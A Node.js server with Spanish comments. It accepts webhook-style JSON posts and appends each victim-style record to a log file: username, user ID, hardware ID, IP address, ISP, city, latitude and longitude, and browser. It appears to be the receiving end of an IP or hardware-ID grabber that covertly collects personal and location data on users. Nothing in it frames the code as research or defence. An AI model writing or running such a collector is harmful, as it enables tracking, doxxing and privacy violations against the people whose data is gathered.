const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const timestamp = new Date().toISOString();
                
                let info = {};

                // Extraemos todos los campos del embed
                if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
                    data.embeds[0].fields.forEach(field => {
                        info[field.name] = field.value;
                    });
                }

                // Creamos un diseño limpio y ordenado tal como pediste
                const logEntry = 
                    `${info["Username"] || 'Desconocido'}\n` +
                    `Join ID: ${info["User ID"] || 'N/A'}\n\n` +
                    `User Info\n` +
                    `Username: ${info["Username"] || 'N/A'}\n` +
                    `User ID: ${info["User ID"] || 'N/A'}\n\n` +
                    `HWID:\n${info["HWID"] || 'N/A'}\n\n` +
                    `Ubicación:\n` +
                    `País: ${info["Country"] || 'N/A'} (Región: ${info["Region"] || 'N/A'}, Ciudad: ${info["City"] || 'N/A'})\n` +
                    `Lat, Long: ${info["Lat, Long"] || 'N/A'}\n` +
                    `ISP: ${info["ISP"] || 'N/A'}\n` +
                    `IP Address: ${info["IP Address"] || 'N/A'}\n\n` +
                    `Detalles Técnicos:\n` +
                    `Navegador / Dispositivo: ${info["Browser"] || 'N/A'}\n` +
                    `Locale: ${info["Locale"] || 'N/A'} | Status: ${info["Status"] || 'N/A'}\n` +
                    `URL: ${info["URL"] || 'N/A'}\n` +
                    `Fecha de Registro: ${timestamp}\n` +
                    `-----------------------------------------\n\n`;
                
                console.log("Nuevo registro ordenado guardado.");

                fs.appendFile('logs.txt', logEntry, err => {
                    if (err) console.error("Error al guardar en el archivo:", err);
                });

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "success", message: "Guardado ordenado" }));
            } catch (e) {
                console.error("Error al procesar JSON:", e);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "error", message: "JSON inválido" }));
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end("Ruta no encontrada");
    }
});

const PORT = process.env.PORT || 26237;
server.listen(PORT, () => {
    console.log(`Servidor activo en el puerto ${PORT}`);
});
